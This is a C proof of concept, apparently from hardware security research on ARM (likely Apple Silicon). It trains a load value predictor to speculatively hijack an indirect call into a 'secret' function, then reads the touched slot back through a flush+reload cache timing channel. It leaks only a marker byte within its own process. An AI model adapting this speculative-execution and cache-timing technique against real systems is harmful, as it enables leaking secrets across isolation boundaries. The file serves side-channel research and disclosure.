#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/sysctl.h>
#include <time.h>

#define PAGE_SZ 16384
#define CACHE_LINE_SZ 128
#define NUM_CACHELINES PAGE_SZ / CACHE_LINE_SZ
#define CACHE_HIT_THRESHOLD 100
#define REPS 250

#define READ(addr) (*(volatile uint32_t *)(addr))
#define FORCE_READ(addr, trash) (READ((uintptr_t)(addr) | (trash == 0xbaaaaad)))

// Note: must serialize with isb and dsb ish
inline __attribute__((always_inline)) void clflush(void *ptr)
{
    asm volatile("dc civac, %0" : : "r"(ptr) : "memory");
}

inline __attribute__((always_inline))
uint64_t
rdtsc()
{
    uint64_t ts;
    asm volatile("dsb ish");
    asm volatile("isb");
    asm volatile("mrs %0, S3_2_c15_c0_0" : "=r"(ts) : :);
    asm volatile("isb");
    return ts;
}

// For shuffling cacheline indices in an array as to randomize
// the memory access pattern.
void shuffle(volatile int *array, volatile int n)
{
    if (n > 1)
    {
        for (int i = 0; i < n - 1; i++)
        {
            volatile int j = i + rand() / (RAND_MAX / (n - i) + 1);
            volatile int temp = array[j];
            array[j] = array[i];
            array[i] = temp;
        }
    }
}

// Does absolutely nothing.
__attribute__((noinline)) void dummy_function(volatile unsigned char *channel_ptr)
{
    return;
}

// Has the same signature as the dummy function
// such that function pointer can be the same type,
// but touches the cache channel array. After that,
// tries to read from address 0. This is a sanity check,
// because any architectural branch to this function
// will make the program segfault.
__attribute__((noinline)) void secret_function(volatile unsigned char *channel_ptr)
{
    *(volatile char *)(channel_ptr + 0x77 * PAGE_SZ);
    *(volatile char *)0;
    return;
}

// For declaring array of function pointers
typedef void (*FuncPtr)(volatile unsigned char *);

// This time, we index into the array of function pointers
// to hijack control flow under speculation.
__attribute__((noinline)) void critical_section(void *page, volatile int *indices, volatile unsigned char *channel_ptr, FuncPtr dummy_ptr, FuncPtr secret_ptr, int iters)
{
    FuncPtr aop[2];
    aop[0] = secret_ptr;
    aop[1] = dummy_ptr;

    register uint64_t trash = 0;
    for (int i = 0; i < iters; i++)
    {
        volatile int idx = indices[i % NUM_CACHELINES];
        trash = FORCE_READ((volatile char *)page + idx * CACHE_LINE_SZ, trash);

        // Use load value as index into AoP, deref the selected ptr,
        // and then branch to the function pointer.
        aop[(uint8_t)trash](channel_ptr);
    }
}

int main(int argc, char *argv[])
{
    struct timespec start, end;
    double elapsed_time;

    clock_gettime(CLOCK_MONOTONIC, &start);

    // Initialize RNG for random page access.
    srand(time(NULL));

    // Set CPU affinity using KDK interface.
    uint32_t CORE_ID = 5;
    volatile uint32_t ret = sysctlbyname("kern.sched_thread_bind_cpu", NULL, NULL, &CORE_ID, sizeof(uint32_t));
    if (ret == -1)
    {
        printf("Error setting CPU core affinity. Please run as root\n");
        return EXIT_FAILURE;
    }

    // Allocate one test page and memset it
    // such that load values become constant.
    void *page = mmap(NULL, PAGE_SZ, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (page == MAP_FAILED)
    {
        printf("Failed to allocate page\n");
        return EXIT_FAILURE;
    }
    else
    {
        memset(page, 0x0, PAGE_SZ);
    }

    // Make array to hold the cacheline indices, then
    // shuffle the order of accesses.
    volatile int indices[NUM_CACHELINES];
    for (int i = 0; i < NUM_CACHELINES; i++)
    {
        indices[i] = i;
    }
    shuffle(indices, NUM_CACHELINES);

    // Allocate the cache channel.
    void *channel_pages = mmap(NULL, 256 * PAGE_SZ, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    unsigned char *channel_ptr;

    if (channel_pages == MAP_FAILED)
    {
        printf("Failed to allocate cache channel pages\n");
        return EXIT_FAILURE;
    }
    else
    {
        memset(channel_pages, 0x99, 256 * PAGE_SZ);
        channel_ptr = (unsigned char *)channel_pages;
    }

    // Training. Note that the pointer to the secret function is never
    // passed, and so it is never executed. The secret function also 
    // loads from address 0x0, so architectural execution results in segfault.
    critical_section(page, indices, channel_ptr, dummy_function, dummy_function, REPS);

    // Flush the cache channel array.
    for (int set = 0; set < 256; ++set)
    {
        clflush((void *)(channel_ptr + set * PAGE_SZ));
    }

    // Change the ground truth load value to be 1 instead of 0. This makes the arch
    // load value for the gadget 0x1, but LVP will predict 0x0.
    memset(page, 0x1, PAGE_SZ);

    // Flush the page's cachelines.
    for (int i = 0; i < NUM_CACHELINES; i++)
    {
        clflush((void *)((volatile char *)page + i * CACHE_LINE_SZ));
    }

    // Serialize the flush operations.
    asm volatile("isb");
    asm volatile("dsb ish");

    // Load the same PC again, activating the LVP. Here, aop[0] will
    // have secret, and aop[1] will have dummy.
    critical_section(page, indices, channel_ptr, dummy_function, secret_function, 1);

    // Measure the cache channel.
    uint64_t timings[256];
    for (int i = 0; i < 256; ++i)
    {
        uint64_t start = rdtsc();
        volatile unsigned char trash = channel_ptr[i * PAGE_SZ];
        uint64_t end = rdtsc();
        timings[i] = end - start;
    }

    // Print out byte values that hit in the cache.
    for (int j = 0; j < 256; ++j)
    {
        if (timings[j] < CACHE_HIT_THRESHOLD)
        {
            printf("~0x%02x: %llu\n", j, timings[j]);
        }
    }

    // Clean up allocations.
    if (munmap(page, PAGE_SZ) == -1)
    {
        printf("Failed to deallocate page\n");
        return EXIT_FAILURE;
    }
    if (munmap(channel_pages, 256 * PAGE_SZ) == -1)
    {
        printf("Failed to deallocate cache channel pages\n");
        return EXIT_FAILURE;
    }

    clock_gettime(CLOCK_MONOTONIC, &end);
    elapsed_time = (end.tv_sec - start.tv_sec) +
                   (end.tv_nsec - start.tv_nsec) / 1E9;

    printf("Elapsed time: %.9f seconds\n", elapsed_time);

    return EXIT_SUCCESS;
}